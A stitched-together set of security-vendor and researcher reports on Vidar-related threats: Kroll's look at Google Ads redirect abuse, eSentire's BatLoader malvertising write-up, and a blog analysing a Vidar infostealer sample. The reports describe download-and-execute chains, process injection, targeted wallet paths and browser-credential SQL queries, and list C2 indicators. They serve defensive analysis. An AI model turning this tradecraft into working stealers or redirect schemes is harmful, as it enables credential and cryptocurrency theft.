"Homoglyph Attack

4/11

This attack method is documented by others within the Security and Incident Response communities and seems to be a favorite hypothesis shared by many to include Kroll’s researchers.

Figure 5: Screenshot Showing the Setting Up of Homoglyph Attack in Google Ads (Source: Kroll) As detailed in Figure 5, Kroll’s threat intelligence team would be able to set up an advert utilizing an international domain name that would pass most viewer’s initial inspection of the domain. If a homoglyph attack was used, it is an exceptionally effective approach with no obviously out-of-place characters.

Figure 6: Zoomed In View of Ad (Source: Kroll) Kroll observed that the ultimate page reached by clicking on the link was not an international domain, but a second, different typo-squatting domain. This inconsistency makes this method appear less probable since the threat actor would need to link to 2 domains via a redirect chain. However, there is a possibility that the threat actor did this to protect their homoglyph domain or they were aware that some web browsers will show the ascii format domain name in the address bar (for example: xn--gmp2ub[. ]org instead of gïmp[. ]org), making the website

5/11

appear more suspicious. Kroll's testing of this process also identified Google's automated domain checking processes which would normally frustrate a threat actor's usage of this methodology."|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|f31c381747e6466fbe778b5466b13ff7
"Tracking Template URL Google Ads allow for the use of a tracking link that would be the first link connected too, in order to store various parameters for your advertising campaign before forwarding on to the target page. With this tracking link set, the display domain remains the domain of the target URL.

Figure 7: Screenshot Showing the Setting Up of a Cross domain Tracking Template in Google Ads (Source: Kroll) It is possible that, by using a malicious tracking link, a threat actor could set up an advert for the legitimate gimp.org and redirect to their malicious page instead of the real page. This is currently the method Kroll assesses has been leveraged by Threat Actors in prior Intrusion Lifecycles. Kroll tested this methodology using a malicious tracking template hosted on a separate domain and successfully redirected an advert click to a third domain - the video of which can be viewed here. The setup used the process described in the official Google documentation for cross-domain redirects.

6/11"|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|fd866ba1a9b14cde8c5d22d0b79bfec5
"6/11

Figure 8: Screenshot of Active Advert Setup using Cross domain Tracking Template (Source: Kroll) By utilizing a custom PHP script on the tracking domain, we were then able to redirect traffic to a proof-of-concept domain instead of the legitimate website. There is some automated checking performed by Google to detect incorrect redirecting; however, this was circumvented with minimal effort. It is likely this automated checking is designed to detect mistakes rather than this specific methodology.

Additional Methodologies Our team also explored a series of less likely scenarios: 1. A configuration setting within the Google Ads system allowing the ability to specify a different target domain to display domain either legitimately allowed or via a bug 2. Use of an open redirect on the gimp.org site 3. A bug in URL validation processes allowing for manipulation of display

Configuration Setting To date, our team have been unable to produce a combination of settings in the Google Ads interface that would allow a different display domain from the target domain.

Use of Open Redirect The Google Ads system extracts the domain it displays in the advert from the Final URL field. If an open redirect were present on the gimp.org website and being used as the Final URL, “gimp.org” would be displayed. It is not possible to test whether Google Ads would detect this without an open redirect vulnerability being present to use in the test.

7/11"|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|2419c9401f634058b655e28311f38dea
"7/11

Figure 9: Screenshot Showing Hypothetical Setup of Attack Using an Open Redirect (Source: Kroll) For this to work, there would have to be an open redirect vulnerability on the gimp.org website; additionally, the aforementioned redirection validation checks performed by google would need bypassing.

Validation Bug It is conceivable that a bug in the validation of inputs might have allowed the manipulation of the advert and target domain. Our team tried a numerous strategies to see what resulted as controlled tests. All tests were caught by server-side validation. However, they were successful in changing the display of the preview advert to not reflect the target domain.

8/11

Figure 10: Screenshot Showing an Attempt to Manipulate the URL to Display Incorrectly (Source: Kroll)

Google Review As mentioned earlier, Google has a review process for adverts. Changes to the advert, including changing domain or tracking link will take the advert offline and require further review."|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|48cdb1bb331845cda18a4d3a54d733de
"Impact Now that this attack has been documented on various websites, it is very likely that other actors will attempt this technique because it can effectively turn any website into a watering hole attack, conveniently placing their malicious website at the top of the Google Search results. While it is particularly dangerous for sites that provide software for download, it could easily be expanded for other purposes. For example, a clone of a login page of a legitimate domain could be hosted for credential harvesting.

Kroll Recommendations Inform and educate personnel of this current attack methodology, making them aware of the dangers of downloading executables from websites that have not been verified as legitimate, particularly in relation to executables found after clicking through any form of online advertising. Where possible, restrict staff from downloading executables, a feature of many web filtering capable proxy servers. 9/11

Require all installs to be performed by information technology staff from vetted binary repositories. Employ endpoint detection and response (EDR) and next-generation anti-virus (NGAV) tools across all endpoints within the environment. Learn more about Kroll’s end-to-end cyber security services or call our Cyber Incident Response Hotline to request immediate assistance.

Stay Ahead with Kroll Cyber Risk Incident response, digital forensics, breach notification, managed detection services, penetration testing, cyber assessments and advisory."|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|d5ef3893c8764944ae7c1a18d1a885a0
"24x7 Incident Response Enlist experienced responders to handle the entire security incident lifecycle.

Computer Forensics Kroll's computer forensics experts ensure that no digital evidence is overlooked and assist at any stage of an investigation or litigation, regardless of the number or location of data sources.

Cyber Risk Retainer Kroll delivers more than a typical incident response retainer—secure a true cyber risk retainer with elite digital forensics and incident response capabilities and maximum flexibility for proactive and notification services.

Ransomware Preparedness Assessment Kroll’s ransomware preparedness assessment helps your organization avoid ransomware attacks by examining 14 crucial security areas and attack vectors.

Malware Analysis and Reverse Engineering Kroll’s Malware Analysis and Reverse Engineering team draws from decades of private and public-sector experience, across all industries, to deliver actionable findings through in-depth technical analysis of benign and malicious code.

Cloud Security Services

10/11

Kroll’s multi-layered approach to cloud security consulting services merges our industryleading team of AWS and Azure-certified architects, cloud security experts and unrivaled incident expertise.

Assessments and Testing Kroll’s field-proven cyber security assessment and testing solutions help identify, evaluate and prioritize risks to people, data, operations and technologies worldwide. Return to top

11/11"|data_input/vidar_reports/entry_10e0ccc3-1dc1-47b2-802a-4ba8d843f6f1.text|557638dc07f74904a1fb30cc04119ab6
"BatLoader Continues to Abuse Google Search Ads to Deliver… esentire.com/blog/batloader-continues-to-abuse-google-search-ads-to-deliver-vidar-stealer-and-ursnif

Partners PARTNER PROGRAM e3 Ecosystem We provide sophisticated cybersecurity solutions for Managed Security Service Providers (MSSPs), Managed Service Providers (MSPs), and Value-Added Resellers (VARs). Find out why you should partner with eSentire, the Authority in Managed Detection and Response, today. Learn more Adversaries don’t work 9-5 and neither do we. At eSentire, our 24/7 SOCs are staffed with Elite Threat Hunters and Cyber Analysts who hunt, investigate, contain and respond to threats within minutes. We have discovered some of the most dangerous threats and nation state attacks in our space – including the Kaseya MSP breach and the more_eggs malware. Our Security Operations Centers are supported with Threat Intelligence, Tactical Threat Response and Advanced Threat Analytics driven by our Threat Response Unit – the TRU team. In TRU Positives, eSentire’s Threat Response Unit (TRU) provides a summary of a recent threat investigation. We outline how we responded to the confirmed threat and what recommendations we have going forward. Here’s the latest from our TRU Team…"|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|aad8227b82d14dcbb9e1329b0f0f226b
"What did we find? In December, we published a summary of BatLoader activity whereby Google Search Ads were used to impersonate software such as WinRAR to deliver malicious Windows Installer files. The installer files contained custom action commands which used PowerShell to download and execute payloads (Redline Stealer, Ursnif, etc.) hosted on legitimate websites. Throughout February 2023, TRU has observed a series of newly registered websites impersonating various applications and brands. Included among these are:

1/12

ChatGPT (chatgpt-t[. ]com) Zoom (zoomvideor[. ]com) Spotify (spotify-uss[. ]com) Tableau (tableau-r[. ]com) Adobe (adobe-l[. ]com) In addition to comparable domain registration attributes, these websites tend to follow a similar naming convention where one or more characters are appended to the impersonated brand name (e.g., adobe-l[. ]com vs adobe.com). These sites were used to host imposter download pages and all likely stem from malicious advertisements on Google Search Ads. A more complete list can be found at the end of this post. BatLoader continues to see changes and improvement since it first emerged in 2022. Recent samples analyzed by TRU utilize Windows Installer files masquerading as the above applications to launch embedded Python scripts."|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|05be6059886248e6a2bbfb7369fa412b
"BatLoader's Python Loader In mid-February 2023, eSentire MDR for Endpoint blocked an attempt to execute Ursnif via code injection on a manufacturing customer’s endpoint. A subsequent investigation traced the infection to a Google search result for Adobe Reader by the victim user. The user had clicked on a top-of-page ad on the search results page where they were directed via an intermediary website (adolbe[. ]website) to adobe-e[. ]com, a webpage masquerading as Adobe Acrobat Reader (Figure 1). As a result, the user unknowingly downloaded and executed AdobeSetup.msi(9ebbe0a1b79e6f13bfca014f878ddeec), BatLoader’s Windows Installer file.

Figure 1 adobe-e[. ]com, Adobe Acrobat Reader lookalike webpage. Like previous versions of BatLoader, the MSI file contains Custom Actions to execute commands. In this case, the command executed an embedded batch file (seen here as InstallPython.bat, also observed as PythonFramework.bat) with admin privileges in a hidden

2/12

window. A decoy application was written to C:\Program Files (x86)\Chat Mapper along with BatLoader scripts and supporting files (Figure 2).

Figure 2 BatLoader Python scripts and supporting files. The batch file (figure 3, insert) performs the following actions: 1. Installs Python 3.9.9 using an included setup binary. 2. Uses pip to install pywin32 and wmi packages. 3. Unpacks the compressed OpenSSL library files using PowerShell into multiple locations. 4. Starts two Python files in sequence after a short timeout."|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|0f0a7f4a9d2a4e528b41fe891f11c7b3
"Figure 3 Batch file execution via Windows Installer custom action.

BatLoader's Python Files

3/12

In this case, two Python files (framework.py and frameworkb.py) were included in the package. These were protected using PyArmor and require unpacking with tools such as PyArmor-Unpacker (Figure 4). The files use a script copied from a Stack Overflow question as a template for executing Python code with elevated privileges.

Figure 4 Decoded Python Loader “framework.py” BatLoader’s instruction set is inserted into the main function of the Stack Overflow Python script. The code retrieves an encrypted payload as control.exe.enc then executes a series of Windows commands. The instructions executed by both Python files were nearly identical except for a change in the payload URL. The commands shown in Figure 5 are summarized as follows: 1. Download encrypted payload control.exe.enc from https://shvarcnegerhistory[. ]com/ The payload is saved under %appdata% or %userprofile%. 2. Modify Defender settings to exclude paths, processes, and file extensions. 3. Decrypt control.exe.enc using the OpenSSL library installed by the previous batch file. The password tor9232jds is used and the file is saved as control.exe. 4. WorkFolders.exe is called, leveraging a signed execution LOLBAS technique to execute control.exe.

4/12"|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|566795885bc94a78914ca6a4ba9998b1
"4/12

Figure 5 Windows commands from “framework.py” and “frameworkb.py”, summarized In the above-mentioned case, the payload intercepted by MDR for Endpoint was Ursnif (md5hash 0cb75b1192b23b8e03d955f1156ad19e), specifically isfb_v2.14+ variant configured to connect to the following C2 domains: uelcoskdi[. ]ru iujdhsndjfks[. ]ru isoridkf[. ]ru gameindikdowd[. ]ru jhgfdlkjhaoiu[. ]su reggy506[. ]ru reggy914[. ]ru

5/12

Ursnif’s persistence was achieved using a registry run key (VirtualStop) under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run. This value executed a shortcut (LineType.lnk) which in turn launches a PowerShell script (CharReturn.ps1), as seen in Figure 6.

Figure 6 CharReturn.ps1 CharReturn.ps1 executed a staged PowerShell loader from registry at HKEY_USERS\Software\AppDataLow\Software\Microsoft\[randomstring]. The loader contained the embedded Ursnif binary which is injected into the Explorer process. In this incident, MDR for Endpoint identified and blocked PowerShell execution of the Ursnif loader stored in registry."|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|95bb7e10dfab4680b5314c0cd97aa06d
"Other Batloader Observations Observed URL structures would suggest multiple payloads are available for download: /t1s1j1/index/c1/?servername=msi /t1s1j1/index/c2/?servername=msi /t1s1j1/index/c3/?servername=msi /t1s1j1/index/c4/?servername=msi /t1s1j1/index/b1/?servername=msi BatLoader has historically been linked to payloads such as Redline Stealer, SystemBC RAT, Syncro RMM, Vidar Stealer, Ursnif and Cobalt Strike. Analysis of more recent samples in March 2023 has yielded both Vidar Stealer and Ursnif trojans. TRU has reviewed samples from public malware repositories which exhibited slightly different behavior than what was seen in the February incident described above. This sample from mid-February contained a third Python file named ‘networkframework.py’:

6/12

Figure 7 BatLoader's batch file containing a third Python file ""networkframework.py"" Like the others, it is obfuscated with PyArmor and contains an identical series of commands to handle payload retrieval, decryption and execution via WorkFolder.exe. In addition, netframework.py contains checks for curating payloads for domain-joined systems with more than 2 IP neighbors in the system’s ARP table."|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|f0914271c9a146b599e59ac42f46327c
"Figure 8 Snippet of BatLoader Python script showing system profiling. This behavior has been previously observed whereby BatLoader executed Cobalt Strike in addition to the standard payloads such as Ursnif or Vidar. We assess this is done to prep systems residing in business networks for further infiltration. As of time of writing, the payload URLs were no longer available for retrieval, but given that this fits into BatLoader’s known historical target selection patterns, we assess that Cobalt Strike is the probable candidate.

How did we find it? eSentire MDR for Endpoint identified and blocked BatLoader’s payload execution.

7/12

What did we do? Our team of 24/7 SOC Cyber Analysts investigated the blocked behavior and worked with the customer on remediating the system."|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|63b7109fc28d4db2b26aaefef1534fa4
"7/12

What did we do? Our team of 24/7 SOC Cyber Analysts investigated the blocked behavior and worked with the customer on remediating the system.

What can you learn from this TRU positive? Use of Google Search Ads by various malware families has been widely observed in early 2023. We wrote about this tactic in a previous TRU Positive post. Despite overall observations diminishing in February 2023, BatLoader’s use continues to persist. This assertion is supported by observations in our own telemetry but also by the continued registration of website infrastructure throughout the month of February. BatLoader targets various popular applications for impersonation, such as ChatGPT, Zoom, Adobe, AnyDesk, Microsoft Teams, Java, etc. This is no accident, as these applications are commonly found in business networks and thus, they would yield more valuable footholds for monetization via fraud or hands-on-keyboard intrusions. Cobalt Strike, a known BatLoader payload, enables hands-on-keyboard access to footholds and facilitates network intrusion actions. BatLoader should be considered a precursor threat to ransomware and any observation prioritized for treatment. A November 2022 report by Microsoft linked Royal Ransomware to BatLoader."|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|12e40554579544fe9157f54b4ecadb52
"Recommendations from our Threat Response Unit (TRU) Team: Raise awareness of malware masquerading as legitimate applications, and include relevant examples within your Phishing and Security Awareness Training (PSAT) program to educate your employees on how to protect themselves against similar cyber threats. Remember – an effective PSAT program emphasizes building cyber resilience by increasing risk awareness, rather than trying to turn everyone into security experts. Protect endpoints against malware. Ensure antivirus signatures are up-to-date. Use a Next-Gen AV (NGAV) or Endpoint Detection and Response (EDR) product to detect and contain threats.

Indicators of Compromise Suspected BatLoader Domains Registered in February 2023: Domain

Creation Date

chatgpt



t[. ]com

2023



02



28

8/12

zoomvideor[. ]com

2023



02



27

adobe



l[. ]com

2023



02



22

freecad



l[. ]com

2023



02



22

microso



t[. ]com

2023



02



22

spotify



uss[. ]com

2023



02



21

quickbooks



q[. ]com

2023



02



21

freecad



f[. ]com2

2023



02



20

java



s[. ]com

2023



02



13

adobe



e[. ]com

2023



02



13

anydesk



o[. ]com

2023



02



13

anydesk



r[. ]com

2023



02



09

java



r[. ]com

2023



02



09

tableau



r[. ]com

2023



02



09

java



a[. ]com

2023



02



07

basecamp



a[. ]com

2023



02



07

adobe



a[. ]com

2023



02



03

visualstudio



t[. ]com

2023



02



03

openoffice



a[. ]com

2023"|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|685a8e76b2c0472c99e44ab3414a7148
"a[. ]com

2023



02



07

adobe



a[. ]com

2023



02



03

visualstudio



t[. ]com

2023



02



03

openoffice



a[. ]com

2023



02



03

bitwarden



t[. ]com

2023



02



01

gimp



t[. ]com

2023



02



01

figma



t[. ]com6

2023



02



01

Other Indicators of Compromise

Indicator

Note

3db1edc5b5550f54abdcb5520cf91d75

Vidar

0cb75b1192b23b8e03d955f1156ad19e

Ursnif

9/12

85fbc743bb686688ce05cf3289507bf7

Ursnif

11ae3dabdb2d2458da43558f36114acb

AdobeSetup.msi (BatLoader)

9ebbe0a1b79e6f13bfca014f878ddeec

AdobeSetup.msi (BatLoader)

shvarcnegerhistory[. ]com

BatLoader C2

Pixelarmada[. ]su

BatLoader C2

uelcoskdi[. ]ru

Ursnif C2

iujdhsndjfks[. ]ru isoridkf[. ]ru gameindikdowd[. ]ru jhgfdlkjhaoiu[. ]su reggy506[. ]ru reggy914[. ]ru eSentire’s Threat Response Unit (TRU) is a world-class team of threat researchers who develop new detections enriched by original threat intelligence and leverage new machine learning models that correlate multi-signal data and automate rapid response to advanced threats. If you are not currently engaged with an MDR provider, eSentire MDR can help you reclaim the advantage and put your business ahead of disruption. Learn what it means to have an elite team of Threat Hunters and Researchers that works for you. Connect with an eSentire Security Specialist.

10/12

eSentire Threat Response Unit (TRU)"|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|8efd1fbe68324db39b4ceea4b3f9621b
"10/12

eSentire Threat Response Unit (TRU)

Our industry-renowned Threat Response Unit (TRU) is an elite team of threat hunters and researchers, that supports our 24/7 Security Operations Centers (SOCs), builds detection models across our Atlas XDR Cloud Platform, and works as an extension of your security team to continuously improve our Managed Detection and Response service. TRU has been recognized for its threat hunting, original research and content development capabilities. TRU is strategically organized into cross-functional groups to protect you against advanced and emerging threats, allowing your organization to gain leading threat intelligence and incredible cybersecurity acumen.

11/12

Cookies allow us to deliver the best possible experience for you on our website - by continuing to use our website or by closing this box, you are consenting to our use of cookies. Visit our Privacy Policy to learn more. Accept

12/12"|data_input/vidar_reports/entry_2b202925-5260-47e2-9cbb-ebe41200234b.text|8b30cdf5a1ae48ecad6f50f813c3f50d
"Analyzing a VIDAR Infostealer Sample J

blog.jaalma.io/vidar



infostealer



analysis/

← Home

Introduction While reviewing samples submitted to Any.Run, I came across a binary that appeared to inject into a target process before performing some suspicious HTTP requests. After further analysis, this binary was found to be consistent with the VIDAR infostealer. This article aims to explain exactly how the infostealer works, the loader chain, what it attempts to steal, and how it exfiltrates data stolen from the host in a short time without leaving a trace. Since this sample already had a dynamic, sandbox run within Any.Run, I decided to download a copy and attempt to reverse engineer it with the aim of understanding more about how it worked, what it was designed to do, and to attempt to identify the malware family. The sample being analyzed in this post has the following file hashes: MD5: 9BB9FD7110158BEA15B3EB3881C52606 SHA1: F545BF2A5E310ED8E9A8F553DA11B5C03D859A79 SHA256: F2FEEFF2C03FE54E6F8415390CFA68671576D4CA598C127B5C73B60864E7372B The entire infection chain and malware operation can be summarized at a high level by this diagram:

1/18"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|6d3652c367894ad4ab92df0a903b1eb3
"1/18

About VIDAR Although this is not unique to the VIDAR malware family, this infostealer performs a smashand-grab approach to harvesting data by harvesting as much data from the host and exfiltrating as quickly as possible. Public reporting shows that delivery mechanisms for the VIDAR infostealer include fake software installers, Windows 11 installers and even malicious Microsoft help files delivered via phishing. Since the service provided to the customers of VIDAR exists only to facilitate payload configuration, generation and C2, it is left to the customer to get the malware on to systems; whether themselves or via a third-party malware distribution service. An example of such a malware distribution service is a group Microsoft tracks as DEV-0569, who leverage techniques such as malvertising, phishing etc. to distribute BATLOADER; a separate malware designed to deliver additional payloads, including VIDAR, ROYAL ransomware and COBALT STRIKE.

Loader Analysis

2/18

Based on the sandbox run, the binary appears to spawn a child process instance of AppLaunch.exe, which is a legitimate binary and part of the .NET framework. The suspicious activity performed by the malware then appears to originate from this legitimate process, which is a good indicator that some form of process injection is occurring."|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|5f8db96cf05f4ed098fc2b879d035343
"Initial Assessment The binary being analyzed has the following characteristics: MD5: 9BB9FD7110158BEA15B3EB3881C52606 SHA1: F545BF2A5E310ED8E9A8F553DA11B5C03D859A79 SHA256: F2FEEFF2C03FE54E6F8415390CFA68671576D4CA598C127B5C73B60864E7372B Compiled Timestamp: Fri Dec 23 14:09:41 2022 UTC Linker: Linker GNU linker ld (GNU Binutils) The executable itself has very few imports, which indicates that there is some form of obfuscation going on to conceal the malware’s true purpose and functionality.

First Stage Loader This first loader works by XOR decrypting at runtime both the second stage malware, and an additional loader shellcode, which loads the final stage payload. It then stores a pointer to the decrypted loader shellcode in the register edx, that was previously made executable using VirtualProtect. Next, it pushes the parameters to be passed to the loader function (consisting of a pointer to the decrypted second stage payload and a filepath to the injection target) on to the stack before executing it with a call edx instruction.

3/18

Second Stage Loader The second stage loader performs the process injection to load the final stage payload into memory. In this case, it used a process hollowing but not really approach to injecting the VIDAR binary into an AppLaunch.exe process. The process injection method uses the following sequence of API calls: NtCreateUserProcess VirtualAlloc VirtualAllocEx WriteProcessMemory ResumeThread"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|cd69e3236ab14e908c7280f088016e3c
"Firstly, NtCreateUserProcess is called with the following arguments to spawn the process injection target in a suspended state.

4/18

NtCreateUserProcess is an undocumented function, however more information about this

function can be found here, and has been well documented by security researchers. For the purposes of this loader, two important arguments are passed: CreateThreadFlags, which is set to 0x01, and corresponds to starting the process in a

suspended state. ProcessParameters, which is a RTL_USER_PROCESS_PARAMETERS structure, and within it

the image path C:\Windows\Microsoft.NET\Framework\v4.0.30319\AppLaunch.exe is provided. Next, the loader calls both VirtualAlloc and VirtualAllocEx to allocate a region in the memory space of the target process for the final payload to be injected.

VirtualAlloc Arguments

VirtualAllocEx Arguments

As per the documentation for these functions, both calls pass in the same arguments. The only difference being that VirtualAlloc is not provided a lpAddress pointer, which results in the function returning a pointer to the allocated memory region, whereas the hProcess argument provided to VirtualAllocEx is 0x009C. Aside from those differences, the arguments provided to both functions are the same: dwSize: 0x67000, which corresponds to 421888 bytes. flAllocationType: 0x03000, which corresponds to both committing and reserving the"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|426bf96ae07541b5ba7685751bb2fcd2
"address range in one step. flProtect: 0x40, which corresponds to read, write and execute (RWX) permissions. 5/18

These API calls serve to allocate a region in memory for the target AppLaunch.exe process that is readable, writable and executable, which allows the loader to finally write the bytes for the finaly payload into this memory region within the target process using WriteProcessMemory. Finally, the injected process is then resumed from its suspended state using ResumeThread, which allows it to execute the injected payload.

Dumping the Injected Payload Dumping the injected payload was straight forward using x32dbg. All that was needed was a breakpoint to be set to pause execution when the malware reaches the WriteProcessMemory call. bp WriteProcessMemory BOOL WriteProcessMemory( [in] HANDLE hProcess, [in] LPVOID lpBaseAddress, [in] LPCVOID lpBuffer, [in] SIZE_T nSize, [out] SIZE_T *lpNumberOfBytesWritten );

WriteProcessMemoryArguments

The arguments passed to WriteProcessMemory correspond to the following: hProcess: 0x009C, which is the same process handle passed into the previous VirtualAllocEx function call. lpBaseAddress: 0x00400000, which corresponds to the image base address in which

the process memory is written. lpBuffer: 0x02EA0000 nSize: 0x67000, which corresponds to the same 421888 bytes. The argument of interest is lpBuffer, which is the pointer to the memory region containing the bytes to be written to the memory space of the new process.

6/18"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|4e53aea0259d4550aa032c370ce57d3c
"6/18

As shown, this memory region starts with a MZ header and DOS string, which means this memory region must contain the binary that is being injected into AppLaunch.exe. The final stage executable payload can then be retrieved by dumping the memory region to disk.

Realigning the Dumped PE When viewing the dumped executable in PEBear, or CFF Explorer, both programs were unable to determine the presence of any imports used by the binary. This is actually because the PE recovered from memory was in a mapped format. This caused a misalignment of section offsets within the raw executable on disk and therefore resulted in a misaligned import address table (IAT). This video explains the concept far better than I can.

Fortunately, we can edit the section table to unmap the sections within the executable and realign the IAT. By setting the raw address offsets to be equivalent to the virtual address offsets, and modifying the section sizes accordingly.

7/18

Now the executable has been correctly aligned, the module and function imports are now readable.

Since we now have an unmapped exectable, it is possible to reverse engineer and analyze the resulting payload. In this case, the reconstructed executable is written in C++."|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|912ddd2d78a4480bb8928040209a12b9
"VIDAR Infostealer Analysis Once the dumped payload has been realigned and otherwise fixed to become a valid portable executable, the second stage executable has the following characteristics: MD5: 47a6959ac869f65dd31e65b1c80fa8b2 SHA1: f9d9ecf59523c202bca9ac4364b2a2042f116f32 SHA256: 1521e9e7b06676a62e30e046851727fe4506bdf400bcf705a426f0f98fba5701 Compiled Timestamp: Mon Dec 19 12:33:40 2022 UTC Compiler: Microsoft Visual C/C++ Linker: Microsoft Linker 10.0 - (Visual Studio 2010)

Encrypted Strings & Module Imports The VIDAR malware stores some of its strings, and module imports in a base64-encoded, RC4 encrypted format. By combining the different functions in the binary, along with the decrypted and decoded strings, we arrive at a full list of browser extensions targeted by the malware. These are mainly cryptocurrency wallets, but also include two factor authentication (2FA) extensions, and other password managers. Before doing anything else, VIDAR first calls a built-in routine to base64-decode and RC4 decrypt each string before writing it into a memory region. A pointer to each string and module import can then be referenced by the malware to use them. 8/18

The malware leverages the BCryptDecrypt API call to decode base64, and a custom-coded RC4 decryption function. Cryptocurrency wallets and 2FA browser extensions and applications targeted by VIDAR

9/18

TronLink

MetaMask

BinanceChainWallet

Yoroi

NiftyWallet

MathWallet

Coinbase

Guarda

EQUALWallet

JaxxLiberty"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|1bbcd2da115746ada943e26c1239c026
"9/18

TronLink

MetaMask

BinanceChainWallet

Yoroi

NiftyWallet

MathWallet

Coinbase

Guarda

EQUALWallet

JaxxLiberty

BitAppWallet

iWallet

Wombat

MewCx

GuildWallet

RoninWallet

NeoLine

CloverWallet

LiqualityWallet

Terra_Station

Keplr

Sollet

AuroWallet

PolymeshWallet

ICONex

Harmony

Coin98

EVER Wallet

KardiaChain

Trezor Password Manager

Rabby

Phantom

BraveWallet

Oxygen (Atomic)

PaliWallet

BoltX

XdefiWallet

NamiWallet

MaiarDeFiWallet

WavesKeeper

Solflare

CyanoWallet

KHC

TezBox

Temple

Goby

Authenticator

Authy

EOS Authenticator

GAuth Authenticator

Tronium

Trust Wallet

10/18

Exodus Web3 Wallet

Braavos

Enkrypt

OKX Web3 Wallet

Sender

Hashpack

Eternl

GeroWallet

Pontem Wallet

Petra Wallet

Martian Wallet

Finnie

Leap Terra

Microsoft AutoFill

Bitwarden

KeePass Tusk

KeePassXC



Browser

Bitwarden

Ethereum\Ethereum\

Electrum\Electrum\wallets\

ElectrumLTC\Electrum



LTC\wallets\

Exodus\exodus\conf.json,window



state.json

\Exodus\exoduswallet\passphrase.json,seed.seco,info.seco

ElectronCash\ElectronCash\wallets\default_wallet

MultiDoge\MultiDoge\multidogewallet

Jaxx_Desktop_Old\jaxx\Local Storage\file__0localstorage

Binance\Binance\app



store.json

Coinomi\Coinomi\wallets\



wallets



config

wallet_path

SOFTWARE\monero



project\monero



core,\Monero\"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|405740711bb7481596bceb947532ae66
"Binance\Binance\app



store.json

Coinomi\Coinomi\wallets\



wallets



config

wallet_path

SOFTWARE\monero



project\monero



core,\Monero\

Also encrypted in the binary are the SQL queries used to harvest data stored in web browsers: SQL queries used by VIDAR to harvest browser data SELECT origin_url, username_value, password_value FROM logins SELECT name, value FROM autofill SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards SELECT target_path, tab_url from downloads SELECT url FROM urls SELECT HOST_KEY, is_httponly, path, is_secure, (expires_utc/1000000)-11644480800, name, encrypted_value from cookies

In addition, one of the encrypted strings, C:\ProgramData\ is the staging directory used by the malware when it downloads additional libraries and stages data for exfiltration. This staging directory appears to be consistent across all VIDAR samples.

11/18

Retrieving C2 Servers The malware stores its C2 servers in an unencrypted format within the binary: hxxps://t[. ]me/traduttoretg hxxps://steamcommunity[. ]com/profiles/76561199445991535 hxxp://5.75.253[. ]16:80"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|031568a730ea4cf98b0abc294b2d9a45
"Interestingly, the VIDAR malware leverages legitimate services to host C2 configuration data. For example, the Telegram and Steam profile links contain IP addresses, whereas the 5.75.253[. ]16 appears to be consistent with threat actor infrastructure. This way, the malware operators can contiunously cycle C2 servers and have the malware beacon back to each new IP address so long as the social media profiles hosting the C2 IP address remain active.

12/18

This particular VIDAR sample uses the string grundic to identify where on the webpage the C2 address is, and grabs the string up until the ending | character.

Initial C2 Callback

13/18

Once the malware has retrieved a C2 IP address from one of the social media profiles hardcoded within the binary, it then submits a HTTP GET request containing the profile ID of the affiliate. Since the VIDAR malware is sold as an infostealer-as-a-service where the cybercriminal gains access to a control panel to configure and generate the malware, this ID is used to retrieve the configuration data set by the VIDAR customer. In this sample, the profile ID is 1375. VIDAR configuration retrieved 1,1,1,1,1,36bfd46626a0b531909b016919dd1fbd,1,1,1,1,0,Default;%DOCUMENTS%\;*.txt;50;tr ue;movies:music:mp3;desktop;%DESKTOP%\;*.txt:*.doc:*.docx:*.xlsx:*.xlsm:*.xls:*.pptx; 950;true;movies:music:mp3:exe;"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|fade8f4d36354493acebba4b534935d7
"Downloading Additional Libraries To be able to perform its full credential harvesting tasks, the VIDAR malware must download additional DLL libraries to extend its capability. For example, to interact with web browsers or use SQLite3. In previous samples, the download of these additional libraries was achieved by sending a HTTP GET request to the C2 server for a ZIP file named with random alphanumeric characters. In an apparent change of technique, or configuration, this sample retrieves the additional libraries by downloading a resource from the C2 server named update.zip.

